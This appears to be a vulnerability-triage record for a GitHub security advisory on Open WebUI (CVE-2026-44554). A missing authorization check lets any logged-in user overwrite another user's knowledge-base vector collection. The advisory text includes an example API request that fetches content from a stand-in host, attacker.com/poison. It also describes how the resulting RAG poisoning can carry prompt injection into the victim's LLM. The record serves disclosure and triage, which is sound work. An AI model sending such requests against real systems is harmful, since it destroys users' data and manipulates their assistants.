@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/27028174?v=4\", \"events_url\": \"https://api.github.com/users/Classic298/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Classic298/followers\", \"following_url\": \"https://api.github.com/users/Classic298/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Classic298/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Classic298\", \"id\": 27028174, \"login\": \"Classic298\", \"node_id\": \"MDQ6VXNlcjI3MDI4MTc0\", \"organizations_url\": \"https://api.github.com/users/Classic298/orgs\", \"received_events_url\": \"https://api.github.com/users/Classic298/received_events\", \"repos_url\": \"https://api.github.com/users/Classic298/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Classic298/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Classic298/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Classic298\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-44554\", \"cvss\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"# Knowledge Base Destruction and RAG Poisoning via Unauthorized Collection Overwrite\\n\\n## Affected Component\\n\\nRetrieval web/YouTube processing endpoints:\\n- `backend/open_webui/routers/retrieval.py` (lines 1810-1837, `process_web`)\\n- `backend/open_webui/routers/retrieval.py` (the parallel `process_youtube` endpoint)\\n- `backend/open_webui/routers/retrieval.py` (line 1445, `save_docs_to_vector_db` call chain)\\n\\n## Affected Versions\\n\\nCurrent main branch (commit `6fdd19bf1`) and likely all versions with RAG/knowledge base functionality.\\n\\n## Description\\n\\nThe `POST /api/v1/retrieval/process/web` endpoint accepts a user-supplied `collection_name` and an `overwrite` query parameter (default: `True`). It performs no authorization check on whether the calling user owns or has write access to the target collection. When `overwrite=True`, `save_docs_to_vector_db` calls `VECTOR_DB_CLIENT.delete_collection()` on the target collection before writing new content.\\n\\nCombined with the knowledge base enumeration vulnerability (separate report), an attacker can trivially discover any user's knowledge base UUID and then destroy or poison it.\\n\\n```python\\n# retrieval.py:1810-1837 — no collection authorization check\\n@router.post('/process/web')\\nasync def process_web(\\n    request: Request,\\n    form_data: ProcessUrlForm,\\n    user=Depends(get_verified_user),\\n    ...\\n):\\n    # ... fetch and process the URL ...\\n    save_docs_to_vector_db(\\n        request=request,\\n        docs=docs,\\n        collection_name=form_data.collection_name,  # attacker-controlled, unchecked\\n        overwrite=overwrite,                        # defaults to True\\n        ...\\n    )\\n```\\n\\n## CVSS 3.1 Breakdown\\n\\n| Metric | Value | Rationale |\\n|--------|-------|-----------|\\n| Attack Vector | Network (N) | Exploited remotely via API call |\\n| Attack Complexity | Low (L) | Single API call with a known KB UUID |\\n| Privileges Required | Low (L) | Requires any authenticated user account |\\n| User Interaction | None (N) | No victim interaction required |\\n| Scope | Unchanged (U) | Impact within the knowledge base authorization boundary |\\n| Confidentiality | None (N) | No data disclosure from this vulnerability directly |\\n| Integrity | High (H) | Complete replacement of victim's KB content with attacker-controlled data |\\n| Availability | High (H) | Victim's original KB embeddings are deleted; KB effectively destroyed |\\n\\n## Attack Scenario\\n\\n1. Attacker discovers victim's KB UUID via the `knowledge-bases` meta-collection (separate finding) or other enumeration.\\n2. Attacker sends:\\n   ```\\n   POST /api/v1/retrieval/process/web?overwrite=true\\n   {\\n     \\\"url\\\": \\\"https://attacker.com/poison\\\",\\n     \\\"collection_name\\\": \\\"<victim_kb_uuid>\\\"\\n   }\\n   ```\\n3. The endpoint fetches content from the attacker's URL.\\n4. `save_docs_to_vector_db` deletes the entire vector collection belonging to the victim's knowledge base.\\n5. The attacker's fetched content is embedded and written as the new collection content.\\n6. Victim's RAG queries against their KB now return attacker-controlled content instead of their original documents.\\n\\n## Impact\\n\\n- **Data destruction:** Victim's original KB embeddings are permanently deleted from the vector store\\n- **RAG poisoning:** Attacker-controlled content replaces legitimate knowledge, causing the LLM to return misleading or malicious answers to the victim\\n- **Indirect prompt injection:** Poisoned content can contain crafted prompts that manipulate the victim's LLM behavior when queried\\n- **Persistence:** The poisoned content persists until the KB is rebuilt from source files\\n\\n## Preconditions\\n\\n- Attacker must have a valid user account\\n- Attacker must know the target collection name (KB UUID) — easily obtained via the `knowledge-bases` enumeration finding\", \"epss\": {\"percentage\": 0.00295, \"percentile\": 0.20929}, \"ghsa_id\": \"GHSA-7r82-qhg4-6wvj\", \"github_reviewed_at\": \"2026-05-08T19:51:14Z\", \"html_url\": \"https://github.com/advisories/GHSA-7r82-qhg4-6wvj\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-7r82-qhg4-6wvj\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-44554\"}], \"nvd_published_at\": \"2026-05-15T20:16:46Z\", \"published_at\": \"2026-05-08T19:51:14Z\", \"references\": [\"https://github.com/open-webui/open-webui/security/advisories/GHSA-7r82-qhg4-6wvj\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-44554\", \"https://github.com/advisories/GHSA-7r82-qhg4-6wvj\"], \"repository_advisory_url\": \"https://api.github.com/repos/open-webui/open-webui/security-advisories/GHSA-7r82-qhg4-6wvj\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/open-webui/open-webui\", \"summary\": \"Open WebUI has Knowledge Base Destruction and RAG Poisoning via Unauthorized Collection Overwrite\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-15T23:52:50Z\", \"url\": \"https://api.github.com/advisories/GHSA-7r82-qhg4-6wvj\", \"vulnerabilities\": [{\"first_patched_version\": \"0.9.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"open-webui\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.8.12\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-7r82-qhg4-6wvj",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "open-webui: <= 0.8.12"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-44554"
+    ],
+    "cvss_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "open-webui"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.015214Z",
+  "provenance": {
+    "content_sha256": "38c665d7b36f5881c7bc77874f114e78caf40be1fd93e7e35608b13d7832446f",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-08T19:51:14Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-7r82-qhg4-6wvj",
+  "status": "active",
+  "title": "Open WebUI has Knowledge Base Destruction and RAG Poisoning via Unauthorized Collection Overwrite",
+  "updated_at": "2026-05-15T23:52:50Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-7r82-qhg4-6wvj"
+}
